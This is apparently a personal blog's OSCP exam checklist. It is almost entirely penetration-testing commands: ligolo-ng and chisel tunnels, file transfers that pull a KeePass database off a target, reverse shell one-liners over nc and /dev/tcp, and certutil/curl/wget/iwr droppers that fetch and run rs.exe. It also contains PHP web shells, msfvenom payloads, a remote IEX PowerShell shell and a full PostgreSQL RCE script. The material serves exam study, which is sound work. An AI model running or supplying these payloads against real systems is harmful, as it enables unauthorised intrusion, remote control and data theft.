<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  <meta name="generator" content="Jekyll">

  <title>OSCP Checklist</title>

  <link rel="stylesheet" href="/css/main.css">
  
</head>

<body>
  <div id="wrapper">
    <header>
  <div>
    <a href="/">
    
    <h1>xinyue@home:~$</h1>
    </a>
    <div class="header-links">
      <a href="/archive"><h2 class="header-link">Archive</h2></a>
<a href="/about"><h2 class="header-link">About</h2></a>
    </div>
  </div>
</header>
    <div class="container">
      <section id="main_content">
        <article>
  <h2>Oscp Checklist</h2>
  <time datetime="2024-11-02T00:00:00-04:00" class="by-line">02 Nov 2024</time>
  <p>Author: Xinyue <br />
This version is suitable for the OSCP exam before the update.</p>

<h1 id="tunnel">Tunnel</h1>

<blockquote>
  <p>https://github.com/nicocha30/ligolo-ng</p>

</blockquote>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//kali</span>
<span class="nx">sudo</span> <span class="nx">ip</span> <span class="nx">tuntap</span> <span class="nx">add</span> <span class="nx">user</span> <span class="nx">kali</span> <span class="nx">mode</span> <span class="nx">tun</span> <span class="nx">ligolo</span>
<span class="nx">sudo</span> <span class="nx">ip</span> <span class="nx">link</span> <span class="kd">set</span> <span class="nx">ligolo</span> <span class="nx">up</span>
<span class="p">.</span><span class="o">/</span><span class="nx">proxy</span> <span class="o">-</span><span class="nx">selfcert</span> <span class="o">-</span><span class="nx">laddr</span> <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">9001</span>
<span class="nx">ligolo</span><span class="o">-</span><span class="nx">ng</span> <span class="o">&gt;&gt;</span> <span class="nx">session</span>
<span class="nx">ligolo</span><span class="o">-</span><span class="nx">ng</span> <span class="o">&gt;&gt;</span> <span class="nx">start</span>

<span class="c1">//win</span>
<span class="p">.</span><span class="o">/</span><span class="nx">agent</span><span class="p">.</span><span class="nx">exe</span> <span class="o">-</span><span class="nx">connect</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span><span class="p">:</span><span class="mi">9001</span> <span class="o">-</span><span class="nx">ignore</span><span class="o">-</span><span class="nx">cert</span>
<span class="c1">//linux</span>
<span class="p">.</span><span class="o">/</span><span class="nx">agent</span> <span class="o">-</span><span class="nx">connect</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span><span class="p">:</span><span class="mi">9001</span> <span class="o">-</span><span class="nx">ignore</span><span class="o">-</span><span class="nx">cert</span>

<span class="c1">//access internal network</span>
<span class="nx">ligolo</span><span class="o">-</span><span class="nx">ng</span> <span class="o">&gt;&gt;</span> <span class="nx">ifconfig</span>
<span class="k">in</span> <span class="nx">another</span> <span class="nx">terminal</span> <span class="p">:</span> <span class="nx">$</span> <span class="nx">sudo</span> <span class="nx">ip</span> <span class="nx">route</span> <span class="nx">add</span> <span class="mf">172.16</span><span class="p">.</span><span class="mf">1.0</span><span class="o">/</span><span class="mi">24</span> <span class="nx">dev</span> <span class="nx">ligolo</span>

<span class="c1">//access localhost</span>
<span class="nx">sudo</span> <span class="nx">ip</span> <span class="nx">route</span> <span class="nx">add</span> <span class="mf">240.0</span><span class="p">.</span><span class="mf">0.1</span><span class="o">/</span><span class="mi">32</span> <span class="nx">dev</span> <span class="nx">ligolo</span>
<span class="nx">nmap</span> <span class="mf">240.0</span><span class="p">.</span><span class="mf">0.1</span> <span class="o">-</span><span class="nx">sV</span>

<span class="c1">//create additional listener</span>
<span class="p">[</span><span class="nx">Agent</span> <span class="p">:</span> <span class="nx">FAKE</span><span class="err">\</span><span class="nx">web_svc</span><span class="p">@</span><span class="nd">MS01</span><span class="p">]</span> <span class="err">»</span> <span class="nx">listener_add</span> <span class="o">--</span><span class="nx">addr</span> <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">4444</span> <span class="o">--</span><span class="nx">to</span> <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">4445</span> <span class="o">--</span><span class="nx">tcp</span>
<span class="nx">nc</span> <span class="o">-</span><span class="nx">nlvp</span> <span class="mi">4445</span> <span class="c1">//connect</span>
<span class="nx">python3</span> <span class="o">-</span><span class="nx">m</span> <span class="nx">http</span><span class="p">.</span><span class="nx">server</span> <span class="mi">4445</span> <span class="c1">//transfer file</span>
</code></pre></div></div>

<p>ssh</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">systemctl</span> <span class="nx">start</span> <span class="nx">ssh</span>
<span class="c1">//3307 on remote to 3306 kali</span>
<span class="nx">ssh</span> <span class="o">-</span><span class="nx">N</span> <span class="o">-</span><span class="nx">R</span> <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">3307</span><span class="p">:</span><span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">3306</span> <span class="nx">kali</span><span class="p">@</span><span class="nd">192</span><span class="p">.</span><span class="mf">168.1</span><span class="p">.</span><span class="mi">1</span>
<span class="nx">ssh</span> <span class="o">-</span><span class="nx">N</span> <span class="o">-</span><span class="nx">R</span> <span class="mi">9998</span> <span class="nx">kali</span><span class="p">@</span><span class="nd">192</span><span class="p">.</span><span class="mf">168.1</span><span class="p">.</span><span class="mi">1</span>
<span class="c1">// forwards all traffic on port 7777 on the remote server to port 7777 on the local machine (127.0.0.1).</span>
<span class="nx">ssh</span> <span class="nx">web_svc</span><span class="p">@</span><span class="nd">192</span><span class="p">.</span><span class="mf">168.1</span><span class="p">.</span><span class="mi">1</span> <span class="o">-</span><span class="nx">D</span> <span class="mi">9090</span> <span class="o">-</span><span class="nx">R</span> <span class="o">*</span><span class="p">:</span><span class="mi">7777</span><span class="p">:</span><span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">7777</span>
</code></pre></div></div>

<p>http</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="o">/</span><span class="nx">chisel</span> <span class="nx">server</span> <span class="o">-</span><span class="nx">p</span> <span class="mi">8000</span> <span class="o">--</span><span class="nx">reverse</span> <span class="err">#</span><span class="nx">kali</span>
<span class="p">.</span><span class="err">\\</span><span class="nx">chisel</span><span class="p">.</span><span class="nx">exe</span> <span class="nx">client</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span><span class="p">:</span><span class="mi">8000</span> <span class="nx">R</span><span class="p">:</span><span class="mi">8090</span><span class="p">:</span><span class="nx">localhost</span><span class="p">:</span><span class="mi">80</span> <span class="err">#</span><span class="nx">windows</span>
</code></pre></div></div>

<h1 id="file-transfer">File Transfer</h1>

<p>Kali ⇒ Any</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">python3</span> <span class="o">-</span><span class="nx">m</span> <span class="nx">http</span><span class="p">.</span><span class="nx">server</span> <span class="mi">80</span>

<span class="nx">php</span> <span class="o">-</span><span class="nx">S</span> <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span>

<span class="nx">impacket</span><span class="o">-</span><span class="nx">smbserver</span> <span class="nx">test</span> <span class="p">.</span> <span class="o">-</span><span class="nx">smb2support</span> <span class="err">#</span><span class="nx">kali</span>
<span class="nx">copy</span><span class="o">-</span><span class="nx">item</span> <span class="err">\\</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span><span class="err">\</span><span class="nx">test</span><span class="err">\</span><span class="nx">nc</span><span class="p">.</span><span class="nx">exe</span> <span class="p">.</span>  <span class="err">#</span><span class="nx">win</span>
</code></pre></div></div>

<p>Win ⇒ Kali</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">impacket</span><span class="o">-</span><span class="nx">smbserver</span> <span class="nx">test</span> <span class="p">.</span> <span class="o">-</span><span class="nx">smb2support</span> <span class="c1">//kali</span>
<span class="nx">copy</span><span class="o">-</span><span class="nx">item</span> <span class="p">.</span><span class="err">\</span><span class="nx">Database</span><span class="p">.</span><span class="nx">kdbx</span> <span class="err">\\</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span><span class="err">\</span><span class="nx">test</span><span class="err">\</span>  <span class="c1">//powershell</span>
<span class="nx">copy</span> <span class="p">.</span><span class="err">\</span><span class="nx">Database</span><span class="p">.</span><span class="nx">kdbx</span> <span class="err">\\</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span><span class="err">\</span><span class="nx">test</span><span class="err">\</span>  <span class="c1">//cmd</span>
</code></pre></div></div>

<p>Linux ⇒ kali</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Sender</span><span class="p">:</span> <span class="nx">nc</span> <span class="o">-</span><span class="nx">w</span> <span class="mi">3</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.1</span> <span class="mi">4444</span> <span class="o">&lt;</span> <span class="nx">file1</span> 
<span class="nx">Receiver</span><span class="p">:</span> <span class="nx">nc</span> <span class="o">-</span><span class="nx">nlvp</span> <span class="mi">4444</span> <span class="o">&gt;</span> <span class="nx">file1</span>
</code></pre></div></div>

<p>evil-winrm</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">upload</span>  <span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">kali</span><span class="o">/</span><span class="nx">Desktop</span><span class="o">/</span><span class="nx">tools</span><span class="o">/</span><span class="nx">privilegeEscalation</span><span class="o">/</span><span class="nx">win</span><span class="o">/</span><span class="nx">winpeas</span><span class="o">/</span><span class="nx">winPEASx64</span><span class="p">.</span><span class="nx">exe</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">Public</span>
<span class="nx">download</span> <span class="nx">file</span> <span class="p">.</span>
</code></pre></div></div>

<p>ssh</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">#</span><span class="nx">upload</span>
<span class="nx">scp</span> <span class="o">-</span><span class="nx">i</span> <span class="nx">id_rsa</span> <span class="nx">linpeas</span><span class="p">.</span><span class="nx">sh</span> <span class="nx">dave</span><span class="p">@</span><span class="nd">192</span><span class="p">.</span><span class="mf">168.1</span><span class="p">.</span><span class="mi">1</span><span class="p">:</span><span class="o">/</span><span class="nx">dev</span><span class="o">/</span><span class="nx">shm</span><span class="o">/</span>
<span class="err">#</span><span class="nx">download</span>
<span class="nx">scp</span> <span class="o">-</span><span class="nx">r</span> <span class="o">-</span><span class="nx">i</span> <span class="nx">id_rsa</span> <span class="nx">dave</span><span class="p">@</span><span class="nd">192</span><span class="p">.</span><span class="mf">168.1</span><span class="p">.</span><span class="mi">1</span><span class="p">:</span><span class="o">/</span><span class="nx">dev</span><span class="o">/</span><span class="nx">shm</span><span class="o">/</span><span class="nx">out</span><span class="p">.</span><span class="nx">txt</span> <span class="p">.</span>
</code></pre></div></div>

<h1 id="initial-access"><strong>Initial Access</strong></h1>

<h2 id="shell">Shell</h2>

<h3 id="supershell---shell-management-tool">SuperShell - Shell Management Tool</h3>

<p>sudo source config.sh  →access via IP:8888</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#!/bin/bash
</span>
<span class="nx">IP_ADDRESS</span><span class="o">=</span><span class="nx">$</span><span class="p">(</span><span class="nx">ip</span> <span class="nx">addr</span> <span class="nx">show</span> <span class="nx">tun0</span> <span class="o">|</span> <span class="nx">grep</span> <span class="dl">'</span><span class="s1">inet </span><span class="dl">'</span> <span class="o">|</span> <span class="nx">awk</span> <span class="dl">'</span><span class="s1">{print $2}</span><span class="dl">'</span> <span class="o">|</span> <span class="nx">cut</span> <span class="o">-</span><span class="nx">d</span><span class="o">/</span> <span class="o">-</span><span class="nx">f1</span><span class="p">)</span>

<span class="k">export</span> <span class="nx">EXTERNAL_ADDRESS</span><span class="o">=</span><span class="nx">$IP_ADDRESS</span>
<span class="nx">cd</span> <span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">kali</span><span class="o">/</span><span class="nx">Desktop</span><span class="o">/</span><span class="nx">Supershell</span> <span class="o">&amp;&amp;</span> <span class="nx">docker</span><span class="o">-</span><span class="nx">compose</span> <span class="nx">up</span> <span class="o">-</span><span class="nx">d</span> <span class="o">--</span><span class="nx">no</span><span class="o">-</span><span class="nx">build</span>
</code></pre></div></div>

<h3 id="reverse-shell--bind-shell">Reverse Shell / Bind Shell</h3>

<p>connect to SuperShell</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//cmd</span>
<span class="nx">certutil</span> <span class="o">-</span><span class="nx">urlcache</span> <span class="o">-</span><span class="nx">split</span> <span class="o">-</span><span class="nx">f</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//192.168.1.1:8888/supershell/compile/download/rs.exe C:\Users\Public\rs1.exe &amp; C:\Users\Public\rs1.exe</span>
<span class="nx">curl</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//192.168.1.1:8888/supershell/compile/download/rs.exe -o rs.exe &amp; rs.exe</span>

<span class="c1">//powershell</span>
<span class="nx">iwr</span> <span class="o">-</span><span class="nx">uri</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//192.168.1.1:8888/supershell/compile/download/rs.exe -Outfile C:\Users\Public\rs.exe ; C:\Users\Public\rs.exe</span>

<span class="c1">//bash</span>
<span class="nx">wget</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//192.168.1.1:8888/supershell/compile/download/rs -O rs; chmod 777 rs; ./rs</span>

</code></pre></div></div>

<p>PHP</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//simple shell
<span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]</span><span class="mf">.</span><span class="s1">' 2&gt;&amp;1'</span><span class="p">);</span> <span class="cp">?&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span><span class="cp">?&gt;</span>

//reverse
all OS: rs.pHp Ivan Sincek https://www.revshells.com/
</code></pre></div></div>

<p>Upgrade simple shell</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">?</span><span class="nx">cmd</span> <span class="o">=</span> <span class="nx">nc</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="mi">80</span> <span class="o">-</span><span class="nx">e</span> <span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">sh</span>
<span class="p">?</span><span class="nx">cmd</span> <span class="o">=</span> <span class="nx">wget</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//192.168.1.1/reverseShell.php</span>
<span class="p">?</span><span class="nx">cmd</span> <span class="o">=</span> <span class="nx">php</span> <span class="nx">reverseShell</span><span class="p">.</span><span class="nx">php</span>
<span class="p">?</span><span class="nx">cmd</span> <span class="o">=</span> <span class="nx">php7</span> <span class="nx">rv1</span><span class="p">.</span><span class="nx">php</span>
<span class="nx">http</span><span class="p">:</span><span class="c1">//192.168.1.1/reverseShell.php</span>
</code></pre></div></div>

<p>Ruby</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">echo</span> <span class="dl">'</span><span class="s1">exec "/bin/bash"</span><span class="dl">'</span> <span class="o">&gt;</span> <span class="nx">app</span><span class="p">.</span><span class="nx">rb</span>
</code></pre></div></div>

<p>Windows</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">https</span><span class="p">:</span><span class="c1">//www.revshells.com/ - Powershell#3base64</span>
<span class="nx">msfvenom</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">shell_reverse_tcp</span> <span class="nx">LHOST</span><span class="o">=</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="nx">LPORT</span><span class="o">=</span><span class="mi">80</span> <span class="nx">EXITFUNC</span><span class="o">=</span><span class="nx">thread</span> <span class="o">-</span><span class="nx">f</span> <span class="nx">exe</span> <span class="o">--</span><span class="nx">platform</span> <span class="nx">windows</span> <span class="o">-</span><span class="nx">o</span> <span class="nx">rs</span><span class="p">.</span><span class="nx">exe</span>
<span class="nx">msfvenom</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">x64</span><span class="o">/</span><span class="nx">shell_reverse_tcp</span> <span class="nx">LHOST</span><span class="o">=</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="nx">LPORT</span><span class="o">=</span><span class="mi">80</span> <span class="nx">EXITFUNC</span><span class="o">=</span><span class="nx">thread</span> <span class="o">-</span><span class="nx">f</span> <span class="nx">exe</span> <span class="o">--</span><span class="nx">platform</span> <span class="nx">windows</span> <span class="o">-</span><span class="nx">o</span> <span class="nx">rs</span><span class="p">.</span><span class="nx">exe</span>
</code></pre></div></div>

<p>Linux</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sr">/bin/</span><span class="nx">sh</span> <span class="o">-</span><span class="nx">i</span> <span class="o">&gt;&amp;</span> <span class="sr">/dev/</span><span class="nx">tcp</span><span class="o">/</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span><span class="o">/</span><span class="mi">4444</span> <span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span>
<span class="nx">rm</span> <span class="o">/</span><span class="nx">tmp</span><span class="o">/</span><span class="nx">f</span><span class="p">;</span><span class="nx">mkfifo</span> <span class="o">/</span><span class="nx">tmp</span><span class="o">/</span><span class="nx">f</span><span class="p">;</span><span class="nx">cat</span> <span class="o">/</span><span class="nx">tmp</span><span class="o">/</span><span class="nx">f</span><span class="o">|</span><span class="nx">sh</span> <span class="o">-</span><span class="nx">i</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span><span class="o">|</span><span class="nx">nc</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="mi">4444</span> <span class="o">&gt;</span><span class="sr">/tmp/</span><span class="nx">f</span>
<span class="nx">nc</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="mi">8080</span> <span class="o">-</span><span class="nx">e</span> <span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">bash</span>
<span class="nx">busybox</span> <span class="nx">nc</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="mi">8080</span> <span class="o">-</span><span class="nx">e</span> <span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">bash</span>
<span class="nx">msfvenom</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">linux</span><span class="o">/</span><span class="nx">x64</span><span class="o">/</span><span class="nx">shell_reverse_tcp</span> <span class="nx">LHOST</span><span class="o">=</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="nx">LPORT</span><span class="o">=</span><span class="mi">80</span> <span class="o">--</span><span class="nx">platform</span> <span class="nx">Linux</span> <span class="o">-</span><span class="nx">f</span> <span class="nx">elf</span> <span class="o">-</span><span class="nx">o</span> <span class="nx">rs</span><span class="p">.</span><span class="nx">elf</span>
<span class="nx">msfvenom</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">linux</span><span class="o">/</span><span class="nx">x64</span><span class="o">/</span><span class="nx">shell_reverse_tcp</span> <span class="nx">LHOST</span><span class="o">=</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="nx">LPORT</span><span class="o">=</span><span class="mi">80</span> <span class="o">-</span><span class="nx">a</span> <span class="nx">x64</span> <span class="o">--</span><span class="nx">platform</span> <span class="nx">Linux</span> <span class="o">-</span><span class="nx">f</span> <span class="nx">elf</span> <span class="o">-</span><span class="nx">o</span> <span class="nx">rs</span><span class="p">.</span><span class="nx">elf</span>
</code></pre></div></div>

<p>JAVA</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">msfvenom</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">java</span><span class="o">/</span><span class="nx">shell_reverse_tcp</span> <span class="nx">LHOST</span><span class="o">=</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="nx">LPORT</span><span class="o">=</span><span class="mi">4444</span> <span class="o">-</span><span class="nx">f</span> <span class="nx">war</span> <span class="o">&gt;</span> <span class="nx">shell</span><span class="p">.</span><span class="nx">war</span>
</code></pre></div></div>

<p>PostgreSQL</p>

<ul>
  <li>https://raw.githubusercontent.com/squid22/PostgreSQL_RCE/main/postgresql_rce.py</li>
</ul>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#!/usr/bin/env python3
</span><span class="k">import</span> <span class="nx">psycopg2</span>

<span class="nx">RHOST</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">192.168.56.47</span><span class="dl">'</span>
<span class="nx">RPORT</span> <span class="o">=</span> <span class="mi">5437</span>
<span class="nx">LHOST</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">192.168.49.56</span><span class="dl">'</span>
<span class="nx">LPORT</span> <span class="o">=</span> <span class="mi">80</span>
<span class="nx">USER</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">postgres</span><span class="dl">'</span>
<span class="nx">PASSWD</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">postgres</span><span class="dl">'</span>

<span class="kd">with</span> <span class="nx">psycopg2</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">host</span><span class="o">=</span><span class="nx">RHOST</span><span class="p">,</span> <span class="nx">port</span><span class="o">=</span><span class="nx">RPORT</span><span class="p">,</span> <span class="nx">user</span><span class="o">=</span><span class="nx">USER</span><span class="p">,</span> <span class="nx">password</span><span class="o">=</span><span class="nx">PASSWD</span><span class="p">)</span> <span class="k">as</span> <span class="nx">conn</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="nx">cur</span> <span class="o">=</span> <span class="nx">conn</span><span class="p">.</span><span class="nx">cursor</span><span class="p">()</span>
        <span class="nx">print</span><span class="p">(</span><span class="dl">"</span><span class="s2">[!] Connected to the PostgreSQL database</span><span class="dl">"</span><span class="p">)</span>
        <span class="nx">rev_shell</span> <span class="o">=</span> <span class="nx">f</span><span class="dl">"</span><span class="s2">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc {LHOST} {LPORT} &gt;/tmp/f</span><span class="dl">"</span>
        <span class="nx">print</span><span class="p">(</span><span class="nx">f</span><span class="dl">"</span><span class="s2">[*] Executing the payload. Please check if you got a reverse shell!</span><span class="se">\n</span><span class="dl">"</span><span class="p">)</span>
        <span class="nx">cur</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="dl">'</span><span class="s1">DROP TABLE IF EXISTS cmd_exec</span><span class="dl">'</span><span class="p">)</span>
        <span class="nx">cur</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="dl">'</span><span class="s1">CREATE TABLE cmd_exec(cmd_output text)</span><span class="dl">'</span><span class="p">)</span>
        <span class="nx">cur</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="dl">'</span><span class="s1">COPY cmd_exec FROM PROGRAM </span><span class="se">\'</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">rev_shell</span>  <span class="o">+</span> <span class="dl">'</span><span class="se">\'</span><span class="dl">'</span><span class="p">)</span>
        <span class="nx">cur</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="dl">'</span><span class="s1">SELEC * from cmd_exec</span><span class="dl">'</span><span class="p">)</span>
        <span class="nx">v</span> <span class="o">=</span> <span class="nx">cur</span><span class="p">.</span><span class="nx">fetchone</span><span class="p">()</span>
        <span class="err">#</span><span class="nx">print</span><span class="p">(</span><span class="nx">v</span><span class="p">)</span>
        <span class="nx">cur</span><span class="p">.</span><span class="nx">close</span><span class="p">()</span>

    <span class="nx">except</span><span class="p">:</span>
        <span class="nx">print</span><span class="p">(</span><span class="nx">f</span><span class="dl">"</span><span class="s2">[!] Something went wrong</span><span class="dl">"</span><span class="p">)</span>
</code></pre></div></div>

<p>ASP.NET</p>

<ul>
  <li>virtual host routing ⇒ access via domain configured in /etc/hosts</li>
</ul>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//reverse shell</span>
<span class="nx">https</span><span class="p">:</span><span class="c1">//github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx</span>
<span class="nx">msfvenom</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">x64</span><span class="o">/</span><span class="nx">shell_reverse_tcp</span> <span class="nx">LHOST</span><span class="o">=</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="nx">LPORT</span><span class="o">=</span><span class="mi">443</span> <span class="o">-</span><span class="nx">f</span> <span class="nx">aspx</span> <span class="o">&gt;</span> <span class="nx">shell_443</span><span class="p">.</span><span class="nx">aspx</span>
</code></pre></div></div>

<p>Writable Path</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">C</span><span class="p">:</span><span class="o">/</span><span class="nx">Users</span><span class="o">/</span><span class="nx">Public</span>
<span class="nx">C</span><span class="p">:</span><span class="o">/</span><span class="nx">Windows</span><span class="o">/</span><span class="nx">Temp</span>
<span class="o">/</span><span class="nx">dev</span><span class="o">/</span><span class="nx">shm</span>
<span class="o">/</span><span class="nx">tmp</span>

<span class="nx">windows</span><span class="p">:</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span> <span class="o">=&gt;</span> <span class="nx">mkdir</span> <span class="nx">tmp</span>
</code></pre></div></div>

<h3 id="tty-shell">TTY shell</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">python3</span> <span class="o">-</span><span class="nx">c</span> <span class="dl">'</span><span class="s1">import pty; pty.spawn("/bin/bash")</span><span class="dl">'</span>
<span class="nx">python</span> <span class="o">-</span><span class="nx">c</span> <span class="dl">'</span><span class="s1">import pty; pty.spawn("/bin/bash")</span><span class="dl">'</span>
<span class="nx">python3</span> <span class="o">-</span><span class="nx">c</span> <span class="dl">'</span><span class="s1">import pty; pty.spawn(["/bin/bash", "--rcfile", "/etc/bash.bashrc"])</span><span class="dl">'</span>
<span class="nx">ctrl</span><span class="o">+</span><span class="nx">Z</span> <span class="nx">and</span> <span class="nx">stty</span> <span class="nx">raw</span> <span class="o">-</span><span class="nx">echo</span> <span class="p">;</span> <span class="nx">fg</span>

<span class="nx">IEX</span><span class="p">(</span><span class="nx">IWR</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001</span>
<span class="nx">stty</span> <span class="nx">raw</span> <span class="o">-</span><span class="nx">echo</span><span class="p">;</span> <span class="p">(</span><span class="nx">stty</span> <span class="nx">size</span><span class="p">;</span> <span class="nx">cat</span><span class="p">)</span> <span class="o">|</span> <span class="nx">nc</span> <span class="o">-</span><span class="nx">lvnp</span> <span class="mi">3001</span>
</code></pre></div></div>

<h3 id="meterpreter-shell">Meterpreter shell</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">msfvenom</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span> <span class="nx">LHOST</span><span class="o">=</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="nx">LPORT</span><span class="o">=</span><span class="mi">443</span>  <span class="nx">EXITFUNC</span><span class="o">=</span><span class="nx">thread</span>  <span class="o">-</span><span class="nx">f</span> <span class="nx">python</span>

<span class="c1">//start meterperter</span>
<span class="nx">msfconsole</span>
<span class="nx">use</span> <span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span>
<span class="kd">set</span> <span class="nx">payload</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span>
<span class="kd">set</span> <span class="nx">LHOST</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span>
<span class="kd">set</span> <span class="nx">LPORT</span> <span class="mi">443</span>
<span class="nx">run</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Started</span> <span class="nx">reverse</span> <span class="nx">TCP</span> <span class="nx">handler</span> <span class="nx">on</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span><span class="p">:</span><span class="mi">443</span> 
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Sending</span> <span class="nx">stage</span> <span class="p">(</span><span class="mi">176198</span> <span class="nx">bytes</span><span class="p">)</span> <span class="nx">to</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">243.40</span>
